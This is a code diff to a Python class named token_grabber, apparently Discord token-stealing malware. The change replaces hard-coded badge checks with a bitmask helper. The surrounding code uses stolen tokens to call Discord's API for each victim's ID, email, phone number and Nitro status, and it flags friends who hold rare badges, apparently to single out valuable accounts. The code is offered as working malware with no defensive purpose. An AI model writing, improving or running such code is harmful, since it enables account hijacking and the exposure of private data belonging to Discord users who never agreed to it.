@@ -66,6 +66,57 @@ class token_grabber():
         self.grabTokens()
         self.embed_accounts(embed)
     
+    def calc_flags(self, flags: int) -> list:
+        flags_dict = {
+            "DISCORD_EMPLOYEE": {
+                "emoji": "<:staff:968704541946167357>",
+                "shift": 0
+            },
+            "DISCORD_PARTNER": {
+                "emoji": "<:partner:968704542021652560>",
+                "shift": 1
+            },
+            "HYPESQUAD_EVENTS": {
+                "emoji": "<:hypersquad_events:968704541774192693>",
+                "shift": 2
+            },
+            "BUG_HUNTER_LEVEL_1": {
+                "emoji": "<:bug_hunter_1:968704541677723648>",
+                "shift": 3
+            },
+            "HOUSE_BRAVERY": {
+                "emoji": "<:hypersquad_1:968704541501571133>",
+                "shift": 6
+            },
+            "HOUSE_BRILLIANCE": {
+                "emoji": "<:hypersquad_2:968704541883261018>",
+                "shift": 7
+            },
+            "HOUSE_BALANCE": {
+                "emoji": "<:hypersquad_3:968704541874860082>",
+                "shift": 8
+            },
+            "EARLY_SUPPORTER": {
+                "emoji": "<:early_supporter:968704542126510090>",
+                "shift": 9
+            },
+            "BUG_HUNTER_LEVEL_2": {
+                "emoji": "<:bug_hunter_2:968704541774217246>",
+                "shift": 14
+            },
+            "VERIFIED_BOT_DEVELOPER": {
+                "emoji": "<:verified_dev:968704541702905886>",
+                "shift": 17
+            },
+            "CERTIFIED_MODERATOR": {
+                "emoji": "<:certified_moderator:988996447938674699>",
+                "shift": 18
+            },
+        }
+
+        return [flags_dict[flag]['emoji'] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+
+    
     def embed_accounts(self, embed) -> None:
         for token in self.tokens:
             r = requests.get("https://discordapp.com/api/v6/users/@me", headers={
@@ -78,32 +129,7 @@ class token_grabber():
             user_id = r.json()['id']
             email = r.json()['email']
             phone = r.json()['phone']
-            
-            emoji_staff = "<:staff:968704541946167357>"
-            emoji_partner = "<:partner:968704542021652560>"
-            emoji_hypesquad_event = "<:hypersquad_events:968704541774192693>"
-            emoji_green_bughunter = "<:bug_hunter_1:968704541677723648>"
-            emoji_hypesquad_bravery = "<:hypersquad_1:968704541501571133>"
-            emoji_hypesquad_brilliance = "<:hypersquad_2:968704541883261018>"
-            emoji_hypesquad_balance = "<:hypersquad_3:968704541874860082>"
-            emoji_early_supporter = "<:early_supporter:968704542126510090>"
-            emoji_gold_bughunter = "<:bug_hunter_2:968704541774217246>"
-            emoji_verified_bot_developer = "<:verified_dev:968704541702905886>"  
-   
-            badges = ""
-            flags = r.json()['public_flags']
-            if (flags == 1): badges += f"{emoji_staff}, "
-            if (flags == 2): badges += f"{emoji_partner}, "
-            if (flags == 4): badges += f"{emoji_hypesquad_event}, "
-            if (flags == 8): badges += f"{emoji_green_bughunter}, "
-            if (flags == 64): badges += f"{emoji_hypesquad_bravery}, "
-            if (flags == 128): badges += f"{emoji_hypesquad_brilliance}, "
-            if (flags == 256): badges += f"{emoji_hypesquad_balance}, "
-            if (flags == 512): badges += f"{emoji_early_supporter}, "
-            if (flags == 16384): badges += f"{emoji_gold_bughunter}, "
-            if (flags == 131072): badges += f"{emoji_verified_bot_developer}, "
-            if (badges == ""): badges = "`None`"
-            if badges.endswith(", "): badges = badges[:-2]   
+            badges = " ".join(self.calc_flags(r.json()['public_flags']))
 
             try:
                 if r.json()['premium_type'] == 1:
@@ -145,17 +171,7 @@ class token_grabber():
                 for friend in f.json():
                     prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
                     if friend['user']['public_flags'] in prefered_flags:
-                        hq_badges = ""
-                        flags = friend['user']['public_flags']
-                        if (flags == 1): hq_badges += f"{emoji_staff}, "
-                        if (flags == 2): hq_badges += f"{emoji_partner}, "
-                        if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
-                        if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
-                        if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
-                        if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
-                        if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
-                        if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
-
+                        hq_badges = " ".join(self.calc_flags(friend['user']['public_flags']))
                         hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
             except TypeError:
                 pass
